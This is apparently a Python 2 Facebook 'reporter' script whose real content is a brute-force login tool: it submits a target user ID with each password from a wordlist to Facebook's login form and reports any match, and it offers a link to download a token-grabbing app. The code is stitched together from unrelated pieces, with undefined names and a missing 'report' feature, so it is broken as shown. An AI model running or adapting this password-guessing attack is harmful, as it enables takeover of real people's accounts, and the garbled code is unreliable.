#!/usr/bin/python
# -*- coding: utf-8 -*-
#Name:Babar Ali
#github (https://github.com/hearthackerBabar)
#hearthacker

import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
os.system("clear")
print """
\033[1;32m######  ######
\033[1;32m#     # #     #
\033[1;32m#     # #     #
\033[1;32m#     # ######
\033[1;32m#     # #   #
\033[1;32m#     # #    #
\033[1;32m######  #     #
\033[1;34m    ____                        __
\033[1;34m   / __ \___  ____  ____  _____/ /____  _____
\033[1;34m  / /_/ / _ \/ __ \/ __ \/ ___/ __/ _ \/ ___/
\033[1;34m / _, _/  __/ /_/ / /_/ / /  / /_/  __/ /
\033[1;34m/_/ |_|\___/ .___/\____/_/   \__/\___/_/
\033[1;34m          /_/
\033[1;91m           [☠️\033[1;91mAuthor Name: Babar Ali 😈     ☠️\033[1;91m]
\033[1;91m           [☠️\033[1;91mPhone Numbr: +923000223253 📳 ☠️\033[1;91m]
\033[1;91m           [☠️\033[1;91mYutube Chnl: Pak Anonymous 💉 ☠️\033[1;91m]
\033[1;91m           [☠️    \033[1;91mCountry: Pakistan  🇵🇰     ☠️\033[1;91m]

\033[1;43m\033[1;37m         😈 PUT ACCOUNT USER ID FOR REPORT 😈           \033[1;0m
"""    
time.sleep(0.5)
user = raw_input('[+] ENTER USER ID 😈💉 : ')
time.sleep(0.8)
##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;91m[1]\x1b[1;95mLogin With Facebook Account  "
        time.sleep(0.05)
        print "\033[1;91m[2]\x1b[1;95mLogin  With Token"
        time.sleep(0.05)
        print "\033[1;91m[3]\x1b[1;95mDownload Token App"
        time.sleep(0.05)
	print "\033[1;91m[0]\033[1;94mExit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;96mChoose an Option: \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        token()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan(' \033[1;91mWarning:\033[1;92m Do Not Use Your Personal Account' )
		jalan(' \033[1;91mWarning:\033[1;92m Use a New Account To Login' )
		jalan(' \033[1;91mWarning: \033[1;92mTermux All Version Work ' )
		jalan(' \033[1;91mWarning: \033[1;92mYour Internet Should Be Fast ' )
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
print '\033[1;47m\033[1;31m               Cracking Has Been Started                   \033[1;0m   '
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '\033[1;97m[+] \033[1;31mPassword Match : '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "\033[1;97m[+] \033[1;32mWrong Password : "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'Sorry, none of the passswords in your wordlist is right.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
